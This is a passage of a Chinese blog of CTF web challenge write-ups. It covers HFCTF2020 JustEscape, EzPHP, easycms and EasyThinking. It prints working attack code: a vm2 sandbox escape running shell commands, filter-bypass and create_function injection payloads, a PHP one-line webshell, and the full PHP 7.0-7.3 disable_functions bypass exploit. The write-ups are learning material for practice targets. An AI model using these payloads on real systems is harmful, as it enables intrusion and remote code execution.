<p>但是我这里不用，嘻嘻</p>
<p>就拿到了flag</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="why">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="why">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | why">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-05-12 20:49:40" itemprop="dateCreated datePublished" datetime="2024-05-12T20:49:40+08:00">2024-05-12</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-06-25 17:10:21" itemprop="dateModified" datetime="2024-06-25T17:10:21+08:00">2024-06-25</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>[HFCTF2020]JustEscape</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212114789.png" alt="image-20240621211441703"></p>
<p>真的是php？</p>
<p>不懂</p>
<p>看到wp中大佬说是vm沙盒，先照着做吧</p>
<p>当code为空时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;code&#x27; ] != NULL ) &#123;</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    echo eval(code);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>所以是一个获取键什么的</p>
<p>这里尝试一下</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212118781.png" alt="image-20240621211843751"></p>
<p>发现一长串报错</p>
<p><strong>error.stack</strong>可以简单解释为用alert()弹出console.log()的一样的异常堆栈信息</p>
<p>在github上可以找到破坏沙盒的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">const &#123;VM&#125; = require(&#x27;vm2&#x27;);</span><br><span class="line">const untrusted = &#x27;(&#x27; + function()&#123;</span><br><span class="line">	TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">	try&#123;</span><br><span class="line">		Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;</span><br><span class="line">	&#125;catch(e)&#123;</span><br><span class="line">		return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+&#x27;)()&#x27;;</span><br><span class="line">try&#123;</span><br><span class="line">	console.log(new VM().run(untrusted));</span><br><span class="line">&#125;catch(x)&#123;</span><br><span class="line">	console.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中选用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">	TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">	try&#123;</span><br><span class="line">		Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;</span><br><span class="line">	&#125;catch(e)&#123;</span><br><span class="line">		return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();</span><br><span class="line">	&#125;)()</span><br></pre></td></tr></table></figure>

<p>但是我们可以发现其中有些字符被过滤，所以，我们通过重写替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function ()&#123;</span><br><span class="line">    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return this.proces`&#125;s`&#125;`)();</span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(``)).a = 1;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>prototyp  &#x3D;&gt; [<code>$&#123;</code>${<code>prototyp</code>}e<code>&#125;</code>]<br>get_process &#x3D;&gt; [<code>$&#123;</code>${<code>get_proces</code>}s<code>&#125;</code>]<br>require &#x3D;&gt; [<code>$&#123;</code>${<code>requir</code>}e<code>&#125;</code>]<br>child_process &#x3D;&gt; <code>$&#123;</code>${<code>child_proces</code>}s<code>&#125;</code><br>execSync &#x3D;&gt; [<code>$&#123;</code>${<code>exe</code>}cSync<code>&#125;</code>]</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212127520.png" alt="image-20240621212758486"></p>
<p>得到flag</p>
<p>[GXYCTF2019]StrongestMind</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212012626.png" alt="image-20240621201241587"></p>
<p>我一开始想过会很难，但是没想到真是写一千次，直接脚本运行！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from requests import *</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line">url = &quot;http://dbbc5a26-5ac4-43d7-8540-ecfdbd1f1879.node5.buuoj.cn:81/&quot;</span><br><span class="line">s=session()</span><br><span class="line">kk = re.compile(r&#x27;\d+ [-|+] \d+&#x27;)</span><br><span class="line">r=s.get(url)</span><br><span class="line"></span><br><span class="line">for i in range(1001):</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    zz=kk.findall(r.text)[0]</span><br><span class="line">    #print(zz)</span><br><span class="line">    zzz=eval(zz)</span><br><span class="line">    #print(zzz)</span><br><span class="line">    data=&#123;&quot;answer&quot;:zzz&#125;</span><br><span class="line">    time.sleep(0.1)</span><br><span class="line">    </span><br><span class="line">    r=s.post(url,data=data)</span><br><span class="line">    </span><br><span class="line">    r.encoding=&#x27;utf-8&#x27;</span><br><span class="line">    </span><br><span class="line">    print((r.text))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>[GKCTF 2021]easycms</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211945743.png" alt="image-20240621194533640"></p>
<p>给我整懵了，我差点以为我点到了其它网站了。</p>
<p>看了眼提示，弱密码五位</p>
<p>在界面四处找了找，发现没有登陆界面，所以扫文件</p>
<p>发现admin.php</p>
<p>所以访问</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211948154.png" alt="image-20240621194846104"></p>
<p>弱密码，可以慢慢试，也可以bp</p>
<p>但是文件名叫admin诶</p>
<p>尝试，最后发现是</p>
<p>admin&#x2F;12345</p>
<p>登录成功</p>
<p>之后在界面里逛逛，发现了一个可以上传文件的地方</p>
<p>在设计-&gt;主题-&gt;导入主题</p>
<p>但是</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211950028.png" alt="image-20240621195039994"></p>
<p>所以，我们要找地方，创建文件</p>
<p>所以就是要找可以创建或者上传文件的地方对吧</p>
<p>按照这个思路，我们可以找到</p>
<p>设计-&gt;组件-&gt;素材库</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211952714.png" alt="image-20240621195220695"></p>
<p>随便上传一个txt上去</p>
<p>之后进行编辑</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211953189.png" alt="image-20240621195311156"></p>
<p>现在的界面的话要更改存储路径来创建一个新文件</p>
<p>根据上文的文件，猜测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../system/tmp/tfeh</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212001660.png" alt="image-20240621200101620"></p>
<p>也就是说，我们现在有这个文件了</p>
<p>所以我们开始猜测怎么爆flag出来</p>
<p>根据上面的，我们猜测这个flag应该和主题有关</p>
<p>所以我们去主题里面看看</p>
<p>随便选择一个主题</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212004631.png" alt="image-20240621200410599"></p>
<p>在这一行里面我们都能看到一个</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212004630.png" alt="image-20240621200438587"></p>
<p>那就很简单了，php源码搞一手</p>
<p>我直接cat &#x2F;flag了</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212005229.png" alt="image-20240621200508201"></p>
<p>之后返回主题，或者在右上角的可视化编辑里面看到页面</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212005045.png" alt="image-20240621200540019"></p>
<p>我是放在友链里，在其它板块也是可以的</p>
<p>[BJDCTF2020]EzPHP’</p>
<p>查看源代码</p>
<p>发现</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202042149.png" alt="image-20240620204218107"></p>
<p>base32解码，得1nD3x.php</p>
<p>访问，得到一长串代码，分开来一个个读（因为很像一关关闯关）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_SERVER) &#123; </span><br><span class="line">  if (</span><br><span class="line">    preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])</span><br><span class="line">    ) </span><br><span class="line">    die(&#x27;You seem to want to do something bad?&#x27;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>啊，基本上全部ban掉了啊</p>
<p>怎么办…</p>
<p>在这里我们可以将要上传的东西进行url编码，因为$_SERVER[‘QUERY_STRING’]不会解码url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; </span><br><span class="line">        $file = $_GET[&quot;file&quot;]; </span><br><span class="line">        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);</span><br></pre></td></tr></table></figure>

<p>之后就是要上传debu，满足debu的值为**&#x2F;^aqua_is_cute$&#x2F;<strong>，但是不能强等于</strong>aqua_is_cute**所以我们可以采用%0a换行符进行绕过，同时url绕过黑名单，所以payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb%75=aq%75a_is_c%75te%0a//%75=u</span><br></pre></td></tr></table></figure>

<p>之后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_REQUEST) &#123; </span><br><span class="line">    foreach($_REQUEST as $value) &#123; </span><br><span class="line">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))  </span><br><span class="line">            die(&#x27;fxck you! I hate English!&#x27;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$_REQUEST也就是说我们可以传get和post，同时，post优先级高于get，所以可以在个体传入之后用post覆盖</p>
<p>该阶段payload如下：</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202051044.png" alt="image-20240620205138007"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);</span><br></pre></td></tr></table></figure>

<p>也就是说要能读取到debu_debu_aqua</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=data://text/plain.deb%75_deb%75_aq%75a</span><br></pre></td></tr></table></figure>

<p>所以用data伪协议写进去就好</p>
<p>payload:</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202102099.png" alt="image-20240620210212072"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[&quot;flag&quot;]);</span><br><span class="line">    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>强比较，可以用数组绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh%61na[]=1&amp;p%61sswd[]=2</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || </span><br><span class="line">preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;, $arg) ) &#123; </span><br><span class="line">    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $code(&#x27;&#x27;, $arg);</span><br><span class="line">&#125; ?&gt;</span><br></pre></td></tr></table></figure>

<p>这里存在**create_function()<strong>注入，而</strong>create_function()**存在两个参数$args和$code。</p>
<p>所以这里我们保证code传入create_function</p>
<p>之后是arg参数</p>
<p>可以使用get_defined_vars()输出所有变量，payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fl%61g[c%6de]=create_function&amp;fl%61g[%61rg]=&#125;var_dump(get_defined_vars());//</span><br></pre></td></tr></table></figure>

<p>所以总payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?deb%75=aq%75a_is_c%75te%0a</span><br><span class="line">&amp;file=data://text/plain,deb%75_deb%75_aq%75a</span><br><span class="line">&amp;sh%61na[]=1&amp;p%61sswd[]=2</span><br><span class="line">&amp;fl%61g[c%6fde]=create_function</span><br><span class="line">&amp;fl%61g[%61rg]=&#125;var_dump(get_defined_vars());//</span><br></pre></td></tr></table></figure>

<p>发现</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202109204.png"></p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202109193.png" alt="屏幕截图 2024-06-20 210915"></p>
<p>重点在最后一句话</p>
<p><strong>[“ffffffff11111114ggggg”]&#x3D;&gt; string(89) “Baka, do you think it’s so easy to get my flag? I hid the real flag in rea1fl4g.php 23333”</strong></p>
<p>也就是说，flag在rea1fl4g.php</p>
<p>访问一下</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202111541.png" alt="image-20240620211146512"></p>
<p>尝试一下伪协议读取源码放在arg中进行读取</p>
<p>因为之前过滤太多了，这里直接取反</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=rea1fl4g.php</span><br><span class="line">-&gt;</span><br><span class="line">%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fl%61g[%61rg]=&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202118606.png" alt="image-20240620211836564"></p>
<p>base64解码得flag</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202120490.png"></p>
<p>[GYCTF2020]EasyThinking</p>
<p>一开始看到我还以为是二次注入呢</p>
<p>但是尝试之后发现不是</p>
<p>所以看看wp</p>
<p>发现是thinkphp框架</p>
<p>所以先看看是哪个版本</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406201922989.png" alt="image-20240620192237924"></p>
<p><strong>session可控，修改session，长度为32位，session后缀改为.php（加上.php后为32位）<br>然后再search搜索的内容会直接保存在&#x2F;runtime&#x2F;session&#x2F;目录下</strong></p>
<p>所以我们注册账号，并在登陆时将session改为32位的php文件</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406201947562.png" alt="image-20240620194714529"></p>
<p>登录之后将在搜索中搜索</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[why]);?&gt;</span><br></pre></td></tr></table></figure>

<p>一句话木马上传完毕，这个木马会保存在session文件中</p>
<p>路径为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">runtime/session/sess_1234567812345678123456781234.php</span><br></pre></td></tr></table></figure>

<p>蚁剑连接</p>
<p>成功之后我们发现无法读取flag，这里要绕过disable_functions</p>
<p>上传exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span><br><span class="line">#</span><br><span class="line"># Bug: https://bugs.php.net/bug.php?id=72530</span><br><span class="line">#</span><br><span class="line"># This exploit should work on all PHP 7.0-7.3 versions</span><br><span class="line">#</span><br><span class="line"># Author: https://github.com/mm0r1</span><br><span class="line"></span><br><span class="line">pwn(&quot;/readflag&quot;);</span><br><span class="line"></span><br><span class="line">function pwn($cmd) &#123;</span><br><span class="line">    global $abc, $helper;</span><br><span class="line"></span><br><span class="line">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ptr2str($ptr, $m = 8) &#123;</span><br><span class="line">        $out = &quot;&quot;;</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; 0xff);</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; 0xff);</span><br><span class="line">            $v &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class="line">        return $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function parse_elf($base) &#123;</span><br><span class="line">        $e_type = leak($base, 0x10, 2);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, 0x20);</span><br><span class="line">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum = leak($base, 0x38, 2);</span><br><span class="line"></span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, 0, 4);</span><br><span class="line">            $p_flags = leak($header, 4, 4);</span><br><span class="line">            $p_vaddr = leak($header, 0x10);</span><br><span class="line">            $p_memsz = leak($header, 0x28);</span><br><span class="line"></span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write</span><br><span class="line">                # handle pie</span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec</span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_basic_funcs($base, $elf) &#123;</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # &#x27;constant&#x27; constant check</span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # &#x27;bin2hex&#x27; constant check</span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_binary_base($binary_leak) &#123;</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = leak($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) &#123; # ELF header</span><br><span class="line">                return $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, 0, 6);</span><br><span class="line"></span><br><span class="line">            if($f_name == 0x6d6574737973) &#123; # system</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        &#125; while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class ryat &#123;</span><br><span class="line">        var $ryat;</span><br><span class="line">        var $chtg;</span><br><span class="line"></span><br><span class="line">        function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;chtg = $this-&gt;ryat;</span><br><span class="line">            $this-&gt;ryat = 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Helper &#123;</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class="line">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = 10; # increase this value if you get segfaults</span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(&#x27;A&#x27;, 79);</span><br><span class="line"></span><br><span class="line">    $poc = &#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[0] = ptr2str(0, 79);</span><br><span class="line">    unset($v);</span><br><span class="line">    $abc = $out[2][0];</span><br><span class="line"></span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;</span><br><span class="line">        die(&quot;UAF failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # leaks</span><br><span class="line">    $closure_handlers = str2ptr($abc, 0);</span><br><span class="line">    $php_heap = str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr = $php_heap - 0xc8;</span><br><span class="line"></span><br><span class="line">    # fake value</span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"></span><br><span class="line">    # fake reference</span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, 8);</span><br><span class="line">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # fake closure object</span><br><span class="line">    $fake_obj_offset = 0xd0;</span><br><span class="line">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # pwn</span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); # internal func type</span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler</span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202004375.png" alt="image-20240620200423324"></p>
<p>之后访问1.php</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202004946.png" alt="image-20240620200439923"></p>
<p>[网鼎杯 2020 半决赛]AliceWebsite</p>
<p>发现源码</p>
